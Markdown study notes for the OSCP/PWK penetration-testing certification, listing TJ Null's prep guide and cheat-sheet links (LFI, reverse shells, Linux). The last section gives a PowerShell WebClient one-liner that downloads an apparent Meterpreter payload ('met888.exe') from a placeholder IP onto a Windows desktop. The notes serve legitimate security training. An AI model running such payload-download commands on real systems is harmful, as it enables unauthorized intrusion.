# TJ Null Path to Try Harder
TJNull presented at BSidesDC 2019.  I've been using his blog as a good reference point to start for things to review BEFORE signing up for PWK.  Some content I decided to put in their own `md` files.  Links can be found here: https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
# Active Recon

## Service Enum - Pen Testing Cheat Sheet

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/
Local File Inclusion (LFI): https://highon.coffee/blog/lfi-cheat-sheet/
Linux Commands: https://highon.coffee/blog/linux-commands-cheat-sheet/ 
`systemd`/`systemctl` cheat sheet: https://highon.coffee/blog/systemd-cheat-sheet/
Reverse Shell Cheat Sheet: https://highon.coffee/blog/reverse-shell-cheat-sheet/

## Transferring Files to Your Account - Linux --> Windows
https://blog.ropnop.com/transferring-files-from-kali-to-windows/
- When on Windows (no `curl` or `wget`) use PS `WebClient` object: `(new-object System.Net.WebClient).DownloadFile('http://IP_ADDR/met888.exe','C:\Users\AdminUser\
Desktop\met888.exe')`